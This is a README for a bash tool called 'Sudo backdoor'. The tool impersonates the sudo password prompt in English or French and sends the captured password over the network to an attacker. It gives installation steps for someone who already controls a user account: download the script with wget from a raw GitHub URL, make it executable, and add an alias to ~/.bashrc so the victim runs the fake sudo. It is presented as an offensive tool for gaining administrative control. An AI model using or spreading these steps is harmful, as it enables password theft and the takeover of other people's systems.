# Sudo backdoor
This bash script mimics the original sudo binary behavior to con a user into
typing his password.

The backdoored sudo displays different message based on the locale language used
on the host (english and french for the time being).

The password is sent over the network for the attacker to retrieve.

## Installation
Once you gain access to a user account that you suspect being sudoer, you can
place this backdoored sudo script to gain administrative control over the host.

```
wget https://raw.githubusercontent.com/nisay759/sudo-backdoor/master/sudo.sh -O /somewhere/sudo
chmod +x /somewhere/sudo
```

Modify the script (the line before the last one) to adapt the extraction method
with a one that fits your use-case.

Next, you want the user to call the backdoored sudo instead of the original one:

```
echo 'alias sudo="/somewhere/sudo"' >> ~/.bashrc
```
for example.

## TODO
- [ ] Add support for other locales
